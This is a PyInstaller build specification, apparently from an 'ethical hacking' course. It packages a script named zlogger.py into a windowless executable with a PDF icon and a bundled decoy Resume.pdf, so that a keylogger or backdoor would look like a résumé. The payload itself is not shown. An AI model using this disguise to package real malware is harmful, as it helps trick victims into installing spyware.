# -*- mode: python -*-

block_cipher = None


a = Analysis(['zlogger.py'],
             pathex=['Z:\\root\\Programs\\Ethical Hacking\\Reverse Backdoor\\Executable Backdoor'],
             binaries=[],
             datas=[('root/Downloads/Resume.pdf', '.')],
             hiddenimports=[],
             hookspath=[],
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher,
             noarchive=False)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          [],
          name='zlogger',
          debug=False,
          bootloader_ignore_signals=False,
          strip=False,
          upx=True,
          runtime_tmpdir=None,
          console=False , icon='\\root\\Downloads\\pdf_ico.ico')
